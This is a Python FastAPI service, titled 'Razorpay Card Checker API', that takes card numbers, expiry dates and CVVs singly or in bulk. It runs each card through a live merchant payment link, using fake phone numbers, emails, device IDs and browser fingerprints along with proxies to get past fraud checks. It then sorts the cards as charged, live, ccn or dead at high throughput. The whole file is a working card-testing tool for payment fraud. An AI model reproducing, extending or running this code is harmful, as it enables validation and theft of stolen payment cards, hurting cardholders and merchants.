"""
FastAPI-based Razorpay Card Checker API
Handles ~200 requests/second with proper async processing
"""

from fastapi import FastAPI, HTTPException, Query, BackgroundTasks, Depends
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel, Field, validator
import asyncio
import aiohttp
import time
import json
import re
import hashlib
import string
import secrets
import base64
import random
from typing import Optional, List
from datetime import datetime
from fake_useragent import UserAgent
from faker import Faker
from urllib.parse import quote
import logging
from contextlib import asynccontextmanager

# ====================== LOGGING ======================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== CONSTANTS ======================
AUTH_TOKEN = "technopile"
GATEWAY = "razorpay"
PAYMENT_URL = "https://razorpay.me/@holidaymoodsadventure"

# Connection pool settings
CONNECTOR_LIMIT = 500
CONNECTOR_LIMIT_PER_HOST = 50
TCP_CONNECTOR_TIMEOUT = 30
REQUEST_TIMEOUT = 30

# Global session
session: Optional[aiohttp.ClientSession] = None
fake = Faker()

# Stats tracking
stats = {
    "charged": 0,
    "live": 0,
    "ccn": 0,
    "dead": 0,
    "error": 0,
    "total_requests": 0,
    "start_time": time.time()
}


# ====================== MODELS ======================
class CardCheckRequest(BaseModel):
    cc: str = Field(..., description="Card number")
    mm: str = Field(..., description="Expiry month (MM)")
    yy: str = Field(..., description="Expiry year (YY or YYYY)")
    cvv: str = Field(..., description="CVV/CVC")
    auth: str = Field(..., description="Authorization token")
    proxy: Optional[str] = Field(None, description="Proxy URL (optional)")
    amount: int = Field(default=1, description="Amount in rupees")
    
    @validator('cc')
    def validate_cc(cls, v):
        if not re.match(r'^\d{15,16}$', v.strip()):
            raise ValueError('Invalid card number')
        return v.strip()
    
    @validator('mm')
    def validate_mm(cls, v):
        mm_int = int(v.strip())
        if not (1 <= mm_int <= 12):
            raise ValueError('Month must be 01-12')
        return str(mm_int).zfill(2)
    
    @validator('cvv')
    def validate_cvv(cls, v):
        if not re.match(r'^\d{3,4}$', v.strip()):
            raise ValueError('CVV must be 3-4 digits')
        return v.strip()
    
    @validator('auth')
    def validate_auth(cls, v):
        if v != AUTH_TOKEN:
            raise ValueError('Invalid authentication token')
        return v


class BulkCardCheckRequest(BaseModel):
    cards: List[str] = Field(..., description="List of cards in format: cc|mm|yy|cvv")
    auth: str = Field(..., description="Authorization token")
    proxy: Optional[str] = Field(None, description="Proxy URL (optional)")
    amount: int = Field(default=1, description="Amount in rupees")
    
    @validator('auth')
    def validate_auth(cls, v):
        if v != AUTH_TOKEN:
            raise ValueError('Invalid authentication token')
        return v


class CardCheckResponse(BaseModel):
    status: str
    card: str
    message: str
    payment_id: Optional[str] = None
    error_code: Optional[str] = None
    time_taken: float
    timestamp: str


# ====================== UTILITIES ======================
def parse_proxy(proxy_input: Optional[str]) -> Optional[dict]:
    """Parse proxy string to dict format"""
    if not proxy_input:
        return None
    
    try:
        if proxy_input.count(':') == 3 and '@' not in proxy_input:
            split = proxy_input.split(':')
            if split[1].isdigit():  # IP:PORT:USER:PASS
                ip, port, user, pwd = split
                proxy_input = f"http://{user}:{pwd}@{ip}:{port}"
            else:  # USER:PASS:IP:PORT
                user, pwd, ip, port = split
                proxy_input = f"http://{user}:{pwd}@{ip}:{port}"
        elif '@' in proxy_input and '://' not in proxy_input:
            proxy_input = 'http://' + proxy_input
        elif proxy_input.count(':') == 1 and '://' not in proxy_input:
            proxy_input = 'http://' + proxy_input
        
        return {"http": proxy_input, "https": proxy_input}
    except:
        return None


def get_card_brand(card_number: str) -> str:
    """Determine card brand from BIN"""
    if card_number.startswith("4"):
        return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"):
        return "mastercard"
    elif card_number[:2] in ("34", "37"):
        return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"):
        return "discover"
    elif card_number.startswith("35"):
        return "jcb"
    elif card_number.startswith("62"):
        return "unionpay"
    else:
        return "unknown"


def gen_indian_phone() -> str:
    """Generate random Indian phone number"""
    first_digit = random.choice(['6', '7', '8', '9'])
    rest = ''.join([str(random.randint(0, 9)) for _ in range(9)])
    return first_digit + rest


def find_between(content: str, start: str, end: str) -> str:
    """Extract text between two markers"""
    try:
        start_idx = content.index(start) + len(start)
        end_idx = content.index(end, start_idx)
        return content[start_idx:end_idx]
    except ValueError:
        return ""


# ====================== LIFESPAN ======================
@asynccontextmanager
async def lifespan(app: FastAPI):
    """Manage application lifecycle"""
    global session
    
    # Startup
    connector = aiohttp.TCPConnector(
        limit=CONNECTOR_LIMIT,
        limit_per_host=CONNECTOR_LIMIT_PER_HOST,
        ttl_dns_cache=300,
        use_dns_cache=True,
        keepalive_timeout=30,
        enable_cleanup_closed=True,
    )
    
    session = aiohttp.ClientSession(
        connector=connector,
        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=10)
    )
    
    logger.info("✅ API Started - Session initialized")
    logger.info(f"📊 Stats: {json.dumps(stats, indent=2)}")
    
    yield
    
    # Shutdown
    await session.close()
    logger.info("❌ API Shutdown - Session closed")
    logger.info(f"📊 Final Stats: {json.dumps(stats, indent=2)}")


# ====================== API APP ======================
app = FastAPI(
    title="Razorpay Card Checker API",
    description="High-performance card validation API",
    version="1.0.0",
    lifespan=lifespan
)


# ====================== CORE CHECKING LOGIC ======================
async def check_card_async(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: Optional[str] = None,
    amount: int = 1
) -> dict:
    """Async card checking logic - optimized for high throughput"""
    
    global session, stats
    stats["total_requests"] += 1
    
    start_time = time.time()
    
    try:
        if not session or session.closed:
            raise Exception("Session not available")
        
        # Prepare session with proxy
        proxies = parse_proxy(proxy_url) if proxy_url else None
        
        # Year formatting
        if len(yy) == 2:
            year = int("20" + yy)
        else:
            year = int(yy)
        
        # Generate metadata
        brand = get_card_brand(cc)
        h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
        ts = str(int(time.time() * 1000))
        rnd = str(random.randrange(10**8)).zfill(8)
        rzp_device_id = f"1.{h}.{ts}.{rnd}"
        
        BASE62 = string.ascii_letters + string.digits
        rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
        
        ua_thread = UserAgent().chrome
        phone_full = "+91" + gen_indian_phone()
        phone_short = phone_full[3:]
        email = fake.user_name() + "@gmail.com"
        
        BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
        BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
        
        amo = amount * 100
        
        # Step 1: Get initial data
        try:
            async with session.get(PAYMENT_URL, proxy=proxies, ssl=False) as resp:
                if resp.status != 200:
                    stats["error"] += 1
                    return {
                        "status": "error",
                        "message": f"Site fetch failed: HTTP {resp.status}",
                        "error_code": f"HTTP_{resp.status}"
                    }
                
                text = await resp.text()
                
            json_text = re.search(r'var data = ({.*?});', text, re.DOTALL)
            if not json_text:
                stats["error"] += 1
                return {
                    "status": "error",
                    "message": "Site data not found",
                    "error_code": "PARSE_ERROR"
                }
            
            init_data = json.loads(json_text.group(1))
            kyid = init_data["key_id"]
            plink = init_data["payment_link"]["id"]
            ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
            keyless_header = init_data.get("keyless_header")
            keyless_header_url = quote(keyless_header.encode('utf-8'), safe='')
        except Exception as e:
            stats["error"] += 1
            return {
                "status": "error",
                "message": f"Initial fetch failed: {str(e)[:100]}",
                "error_code": "INIT_ERROR"
            }
        
        # Step 2: Create order
        try:
            headers_order = {
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
                'Origin': 'https://pages.razorpay.com',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua_thread,
            }
            json_order = {
                'notes': {'comment': '', 'name': 'API User'},
                'line_items': [{'payment_page_item_id': ppid, 'amount': amo}],
            }
            
            async with session.post(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                headers=headers_order,
                json=json_order,
                proxy=proxies,
                ssl=False
            ) as resp:
                if resp.status != 200:
                    stats["error"] += 1
                    return {
                        "status": "error",
                        "message": "Order creation failed",
                        "error_code": f"ORDER_HTTP_{resp.status}"
                    }
                
                order_data = await resp.json()
                order_id = order_data["order"]["id"]
                checkout_id = order_id.split("_")[1]
        except Exception as e:
            stats["error"] += 1
            return {
                "status": "error",
                "message": f"Order creation failed: {str(e)[:100]}",
                "error_code": "ORDER_ERROR"
            }
        
        # Step 3: Get public data
        try:
            headers_public = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua_thread,
            }
            params_public = {
                'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
                'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
                'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
            }
            
            async with session.get(
                'https://api.razorpay.com/v1/checkout/public',
                params=params_public,
                headers=headers_public,
                proxy=proxies,
                ssl=False
            ) as resp:
                public_text = await resp.text()
                
            sessid = find_between(public_text, 'window.session_token="', '";')
            if not sessid:
                match = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', public_text)
                if match:
                    sessid = match.group(1)
            
            if not sessid:
                stats["error"] += 1
                return {
                    "status": "error",
                    "message": "Session token not found",
                    "error_code": "SESSID_NOT_FOUND"
                }
        except Exception as e:
            stats["error"] += 1
            return {
                "status": "error",
                "message": f"Public data fetch failed: {str(e)[:100]}",
                "error_code": "PUBLIC_ERROR"
            }
        
        # Step 4: Get preferences
        try:
            headers_pref = {
                'Accept': '*/*', 'Content-type': 'application/json', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua_thread, 'x-session-token': sessid,
            }
            params_pref = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
            json_pref = {
                'query': [{'resource': r} for r in ['checkout_version_config', 'merchant', 'merchant_features', 'downtime', 'customer', 'customer_tokens', 'truecaller', 'methods', 'experiments', 'offers', 'checkout_config', 'order', 'invoice', 'buyer_protection', 'personalization']],
                'query_params': {
                    'device_id': rzp_device_id, 'rtb_device_id': h, 'amount': amo,
                    'currency': 'INR', 'option_currency': 'INR', 'truecaller': False,
                    'qr_required': False, 'library': 'checkoutjs', 'platform': 'browser',
                    'order_id': order_id, 'payment_link_id': plink, 'contact': phone_full,
                },
                'action': 'get',
            }
            
            async with session.post(
                'https://api.razorpay.com/v2/standard_checkout/preferences',
                params=params_pref,
                headers=headers_pref,
                json=json_pref,
                proxy=proxies,
                ssl=False
            ) as resp:
                pass  # Just need to make the request
        except Exception as e:
            pass  # Non-critical
        
        # Step 5: Checkout order
        try:
            headers_co = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua_thread, 'x-session-token': sessid,
            }
            params_co = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            data_co = {
                'notes[email]': email, 'notes[phone]': phone_short, 'payment_link_id': plink,
                'key_id': kyid, 'contact': phone_full, 'email': email, 'currency': 'INR',
                '_[integration]': 'payment_pages', '_[device.id]': rzp_device_id,
                '_[library]': 'checkoutjs', '_[library_src]': 'no-src', '_[current_script_src]': 'no-src',
                '_[platform]': 'browser', '_[env]': '', '_[is_magic_script]': 'false', '_[os]': 'windows',
                '_[shield][fhash]': h, '_[shield][tz]': '0', '_[device_id]': rzp_device_id,
                '_[build]': BUILD, '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
                '_[shield][browser]': 'chrome', '_[request_index]': '0', 'amount': amo,
                'order_id': order_id, 'method': 'card', 'checkout_id': checkout_id,
            }
            
            async with session.post(
                'https://api.razorpay.com/v1/standard_checkout/checkout/order',
                params=params_co,
                headers=headers_co,
                data=data_co,
                proxy=proxies,
                ssl=False
            ) as resp:
                resp_text = await resp.text()
                try:
                    coid_local = json.loads(resp_text).get("checkout_id", checkout_id)
                except:
                    coid_local = checkout_id
        except Exception as e:
            pass  # Non-critical
        
        # Step 6: Cross-border flow
        try:
            headers_cb = {
                "Accept": "*/*", "Content-type": "application/json", "User-Agent": ua_thread, "x-session-token": sessid, "Origin": "https://api.razorpay.com",
                "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
            }
            payload_cb = {
                "identifiers": {"merchant": {"country": "IN"}, "card": {"country": "US", "dcc_blacklist": False, "network": brand}, "method": "card", "payment_currency": "INR"},
                "forex_charges": {"amount": amo, "currency": "INR", "filters": {"method": "card"}}
            }
            
            async with session.post(
                f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={keyless_header_url}",
                headers=headers_cb,
                json=payload_cb,
                proxy=proxies,
                ssl=False
            ) as resp:
                pass
        except Exception as e:
            pass  # Non-critical
        
        # Step 7: Create payment
        try:
            headers_create = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua_thread, 'x-session-token': sessid,
            }
            params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
            token_create = base64.b64encode(json.dumps([{"name": "sardine", "metadata": {"session_id": coid_local}}], separators=(',', ':')).encode()).decode()
            data_create = {
                "user_risk_providers_token": token_create, 'notes[comment]': '', 'notes[email]': email,
                'notes[phone]': phone_short, 'notes[name]': 'API User', 'payment_link_id': plink, 'key_id': kyid,
                'contact': phone_full, 'email': email, 'currency': 'INR', '_[integration]': 'payment_pages',
                '_[checkout_id]': coid_local, '_[device.id]': rzp_device_id, '_[env]': '', '_[library]': 'checkoutjs',
                '_[library_src]': 'no-src', '_[current_script_src]': 'no-src', '_[is_magic_script]': 'false',
                '_[platform]': 'browser', '_[referer]': PAYMENT_URL, '_[shield][fhash]': h, '_[shield][tz]': '-330',
                '_[device_id]': rzp_device_id, '_[build]': BUILD, '_[shield][os]': 'windows',
                '_[shield][platform]': 'browser', '_[shield][browser]': 'chrome', '_[request_index]': '1',
                'amount': amo, 'order_id': order_id, 'method': 'card', 'card[number]': cc,
                'card[cvv]': cvv, 'card[name]': 'API User', 'card[expiry_month]': mm, 'card[expiry_year]': year,
                'save': '0', 'dcc_currency': 'INR',
            }
            
            async with session.post(
                'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
                params=params_create,
                headers=headers_create,
                data=data_create,
                proxy=proxies,
                ssl=False,
                allow_redirects=True
            ) as resp:
                resp_text = await resp.text()
                pay_json = json.loads(resp_text)
                payment_id = pay_json.get("payment_id") or pay_json.get("id")
                
                if not payment_id:
                    stats["dead"] += 1
                    return {
                        "status": "dead",
                        "message": "Payment ID not found",
                        "error_code": "NO_PAYMENT_ID"
                    }
        except Exception as e:
            stats["error"] += 1
            return {
                "status": "error",
                "message": f"Payment creation failed: {str(e)[:100]}",
                "error_code": "PAYMENT_CREATE_ERROR"
            }
        
        # Step 8: Authenticate
        try:
            pid_clean = payment_id.split("_")[1]
            url_auth1 = f"https://api.razorpay.com/pg_router/v1/payments/{payment_id}/authenticate"
            headers_3ds = {"content-type": "application/x-www-form-urlencoded", "user-agent": ua_thread}
            
            async with session.post(
                url_auth1,
                headers=headers_3ds,
                proxy=proxies,
                ssl=False
            ) as resp:
                pass
            
            await asyncio.sleep(0.5)  # Reduced from 1 second for better throughput
            
            browser_data = {
                'browser[java_enabled]': 'false', 'browser[javascript_enabled]': 'true',
                'browser[timezone_offset]': '0', 'browser[color_depth]': str(random.choice([24, 32])),
                'browser[screen_width]': str(random.choice([1920, 1366, 1536, 1440])),
                'browser[screen_height]': str(random.choice([1080, 768, 864, 900])),
                'browser[language]': 'en-US', 'auth_step': '3ds2Auth'
            }
            
            url_auth_final = f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate"
            async with session.post(
                url_auth_final,
                headers=headers_3ds,
                data=browser_data,
                proxy=proxies,
                ssl=False
            ) as resp:
                pass
        except Exception as e:
            pass  # Non-critical
        
        # Step 9: Final result
        try:
            headers_fin = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua_thread, 'x-session-token': sessid,
            }
            params_fin = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            
            async with session.get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel",
                params=params_fin,
                headers=headers_fin,
                proxy=proxies,
                ssl=False
            ) as resp:
                final_text = await resp.text()
                final_json = json.loads(final_text)
        except Exception as e:
            stats["error"] += 1
            return {
                "status": "error",
                "message": f"Final fetch failed: {str(e)[:100]}",
                "error_code": "FINAL_ERROR"
            }
        
        # Parse final response
        time_taken = round(time.time() - start_time, 2)
        
        if "razorpay_payment_id" in final_text:
            payment_id_final = final_json.get("razorpay_payment_id", "N/A")
            stats["charged"] += 1
            return {
                "status": "charged",
                "message": "Transaction Successful",
                "payment_id": payment_id_final,
                "time_taken": time_taken
            }
        else:
            error_desc = final_json.get("error", {}).get("description", "Unknown Error")
            err_code = final_json.get("error", {}).get("reason", "N/A")
            msg_lower = error_desc.lower()
            
            if any(k in msg_lower for k in ["insufficient account balance", "maximum transaction limit"]):
                stats["live"] += 1
                return {
                    "status": "live",
                    "message": error_desc,
                    "error_code": err_code,
                    "time_taken": time_taken
                }
            elif "cvv provided is incorrect" in msg_lower or "incorrect_cvv" in msg_lower:
                stats["ccn"] += 1
                return {
                    "status": "ccn",
                    "message": error_desc,
                    "error_code": err_code,
                    "time_taken": time_taken
                }
            else:
                stats["dead"] += 1
                return {
                    "status": "dead",
                    "message": error_desc,
                    "error_code": err_code,
                    "time_taken": time_taken
                }
    
    except Exception as e:
        stats["error"] += 1
        time_taken = round(time.time() - start_time, 2)
        return {
            "status": "error",
            "message": str(e)[:100],
            "error_code": "UNKNOWN_ERROR",
            "time_taken": time_taken
        }


# ====================== ENDPOINTS ======================

@app.post("/check", response_model=CardCheckResponse)
async def check_card(request: CardCheckRequest):
    """Check a single card"""
    try:
        result = await check_card_async(
            cc=request.cc,
            mm=request.mm,
            yy=request.yy,
            cvv=request.cvv,
            proxy_url=request.proxy,
            amount=request.amount
        )
        
        return CardCheckResponse(
            status=result.get("status"),
            card=f"{request.cc[:6]}...{request.cc[-4:]}",
            message=result.get("message"),
            payment_id=result.get("payment_id"),
            error_code=result.get("error_code"),
            time_taken=result.get("time_taken", 0),
            timestamp=datetime.now().isoformat()
        )
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.post("/check-bulk")
async def check_bulk(request: BulkCardCheckRequest):
    """Check multiple cards concurrently"""
    try:
        tasks = []
        
        for card_str in request.cards:
            parts = card_str.split("|")
            if len(parts) != 4:
                continue
            
            tasks.append(check_card_async(
                cc=parts[0].strip(),
                mm=parts[1].strip(),
                yy=parts[2].strip(),
                cvv=parts[3].strip(),
                proxy_url=request.proxy,
                amount=request.amount
            ))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        formatted_results = []
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                formatted_results.append({
                    "status": "error",
                    "message": str(result),
                    "card_index": i
                })
            else:
                formatted_results.append({
                    **result,
                    "card_index": i
                })
        
        return {
            "total": len(request.cards),
            "results": formatted_results,
            "stats": {
                "charged": sum(1 for r in formatted_results if r.get("status") == "charged"),
                "live": sum(1 for r in formatted_results if r.get("status") == "live"),
                "ccn": sum(1 for r in formatted_results if r.get("status") == "ccn"),
                "dead": sum(1 for r in formatted_results if r.get("status") == "dead"),
                "errors": sum(1 for r in formatted_results if r.get("status") == "error"),
            },
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/stats")
async def get_stats():
    """Get API statistics"""
    uptime = time.time() - stats["start_time"]
    return {
        "stats": {
            "charged": stats["charged"],
            "live": stats["live"],
            "ccn": stats["ccn"],
            "dead": stats["dead"],
            "errors": stats["error"],
            "total_requests": stats["total_requests"],
        },
        "uptime_seconds": uptime,
        "requests_per_second": stats["total_requests"] / uptime if uptime > 0 else 0,
        "timestamp": datetime.now().isoformat()
    }


@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "session_active": session is not None and not session.closed
    }


@app.get("/")
async def root():
    """API documentation"""
    return {
        "name": "Razorpay Card Checker API",
        "version": "1.0.0",
        "endpoints": {
            "POST /check": "Check a single card",
            "POST /check-bulk": "Check multiple cards concurrently",
            "GET /stats": "Get API statistics",
            "GET /health": "Health check",
            "GET /docs": "Interactive API documentation"
        },
        "auth": "auth=technopile",
        "example_request": {
            "cc": "4111111111111111",
            "mm": "12",
            "yy": "25",
            "cvv": "123",
            "auth": "technopile",
            "amount": 1
        }
    }


if __name__ == "__main__":
    import uvicorn
    
    # Run with: uvicorn api_service:app --host 0.0.0.0 --port 8000 --workers 4
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        workers=4,
        loop="uvloop",  # Much faster event loop
    )
